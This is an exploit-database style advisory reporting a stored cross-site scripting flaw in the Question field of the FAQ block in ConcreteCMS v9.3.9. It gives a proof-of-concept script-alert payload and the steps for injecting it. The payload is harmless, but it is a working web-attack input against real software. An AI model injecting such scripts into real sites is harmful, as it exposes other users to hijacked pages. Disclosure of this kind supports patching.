# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
## Date: 3/10/2025
## Vendor Homepage: https://github.com/concretecms/concretecms
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Concretecms
## Version: v9.3.9
## Exploit Description:
## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Question field when adding a FAQ block. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------

```
<script>alert('XSS');</script>
```

While editing the FAQ, add <script>alert('XSS');</script> to the question field and then click add question,the xss vulnerability appears.

